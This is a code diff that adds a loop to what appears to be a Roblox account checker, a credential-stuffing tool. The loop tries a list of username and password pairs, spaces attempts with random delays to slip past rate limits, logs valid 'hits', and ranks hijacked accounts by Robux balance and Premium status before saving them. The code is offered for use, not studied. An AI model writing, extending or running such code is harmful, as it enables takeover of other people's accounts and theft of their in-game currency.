@@ -1456,6 +1456,126 @@ def get_input(prompt, default=None, input_type=str):
             print(f"[-] Invalid input. Please enter a valid {input_type.__name__}.")
 
 
+def start_verification_simple(self):
+    """Simple single-threaded verification for web interface"""
+    if not self.accounts:
+        print("[-] No accounts to verify")
+        self.recent_results.append("[-] No accounts to verify")
+        return
+    
+    self.running = True
+    self.recent_results = []
+    self.all_results = []
+    
+    total = len(self.accounts[:self.max_accounts_per_test])
+    
+    print(f"\n[+] Starting verification of {total} accounts...")
+    print(f"[+] Mode: {self.mode.value}")
+    print(f"[+] Delay: {self.min_delay}-{self.max_delay}s")
+    print("-" * 50)
+    
+    self.stats['start_time'] = time.time()
+    
+    for idx, account in enumerate(self.accounts[:self.max_accounts_per_test], 1):
+        if not self.running:
+            print("[!] Stopped by user")
+            self.recent_results.append("[!] Stopped by user")
+            break
+        
+        print(f"[{idx}/{total}] Checking: {account.username}")
+        
+        # Verify the account
+        result = self.verify_account(account, idx)
+        
+        # Update stats
+        self.stats['verified'] += 1
+        
+        # Handle result
+        if result.status == 'valid':
+            self.stats['valid'] += 1
+            if result.premium:
+                self.stats['premium_accounts'] += 1
+            if result.robux > 0:
+                self.stats['total_robux'] += result.robux
+            if result.robux > 1000 or result.premium:
+                self.stats['high_value_accounts'] += 1
+            
+            # Save hit
+            self.save_hit(result)
+            
+            # Add to recent results
+            hit_msg = f"[HIT] {result.username} | R${result.robux}"
+            if result.premium:
+                hit_msg += " [PREMIUM]"
+            if result.country_name:
+                hit_msg += f" | {result.country_name}"
+            self.recent_results.append(hit_msg)
+            print(f"  ✅ {hit_msg}")
+            
+        elif result.status == 'invalid_password':
+            self.stats['wrong_password'] += 1
+            msg = f"[WRONG] {result.username}"
+            self.recent_results.append(msg)
+            print(f"  ❌ {msg}")
+            
+        elif result.status == 'captcha':
+            self.stats['captcha'] += 1
+            msg = f"[CAPTCHA] {result.username}"
+            self.recent_results.append(msg)
+            print(f"  🤖 {msg}")
+            
+        elif result.status == 'timeout':
+            self.stats['timeout'] += 1
+            msg = f"[TIMEOUT] {result.username}"
+            self.recent_results.append(msg)
+            print(f"  ⏱️ {msg}")
+            
+        elif result.status == 'rate_limit':
+            self.stats['rate_limit'] += 1
+            msg = f"[RATE] {result.username}"
+            self.recent_results.append(msg)
+            print(f"  ⚠️ {msg}")
+            
+        elif result.status == 'blocked':
+            self.stats['blocked'] += 1
+            msg = f"[BLOCKED] {result.username}"
+            self.recent_results.append(msg)
+            print(f"  🚫 {msg}")
+            
+        elif result.status == 'driver_error':
+            self.stats['driver_error'] += 1
+            msg = f"[DRIVER] {result.username}"
+            self.recent_results.append(msg)
+            print(f"  ⚠️ {msg}")
+            
+        else:
+            self.stats['other_errors'] += 1
+            msg = f"[ERROR] {result.username}: {result.message[:30]}"
+            self.recent_results.append(msg)
+            print(f"  ❌ {msg}")
+        
+        # Keep only last 50 results
+        if len(self.recent_results) > 50:
+            self.recent_results = self.recent_results[-50:]
+        
+        # Update stats for web
+        self.stats['recent_results'] = self.recent_results[-10:]
+        
+        # Delay between checks
+        if idx < total and self.running:
+            delay = random.uniform(self.min_delay, self.max_delay)
+            time.sleep(delay)
+    
+    # Show final summary
+    print("\n" + "=" * 50)
+    print("[+] VERIFICATION COMPLETE")
+    print(f"[+] Total checked: {self.stats['verified']}")
+    print(f"[+] Valid hits: {self.stats['valid']}")
+    print(f"[+] Premium: {self.stats['premium_accounts']}")
+    print(f"[+] Total Robux: {self.stats['total_robux']:,}")
+    print(f"[+] High value: {self.stats['high_value_accounts']}")
+    print("=" * 50)
+    
 def main():
     show_banner()
     
